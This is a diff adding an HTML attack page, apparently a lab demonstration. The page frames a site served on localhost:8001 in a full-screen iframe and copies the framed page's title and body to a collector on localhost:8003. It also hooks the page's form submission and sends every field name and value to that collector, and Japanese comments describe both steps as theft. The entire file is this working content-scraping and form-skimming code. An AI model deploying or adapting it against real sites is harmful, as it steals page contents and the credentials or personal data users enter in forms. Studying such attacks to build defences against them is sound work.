@@ -1,0 +1,24 @@
+<body>
+    <iframe onload="getContent(this)" src=http://localhost:8001 style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999; background-color:#EDF7FF;">
+    </iframe>
+    <script>
+        /*読み込みが発生したタイミングでコンテンツを窃取*/
+        function getContent(elm){
+            let title = elm.contentWindow.document.title;
+            let body = elm.contentWindow.document.body.innerHTML;
+            fetch("http://localhost:8003?content=" + encodeURIComponent(title + ":" + body));
+
+            /*入力フォームがあったら送信時の入力値を窃取*/
+            let form = elm.contentWindow.document.forms[0];
+            if (form != null) {
+                form.addEventListener("submit", function(){
+                    let inputs = "";
+                    for (let i = 0; i < this.length; i++) {
+                        inputs += this[i].name + ":" + this[i].value + ";";
+                    }
+                    fetch("http://localhost:8003?input=" + encodeURIComponent(inputs));
+                });   
+            }
+        }
+    </script>
+</body>
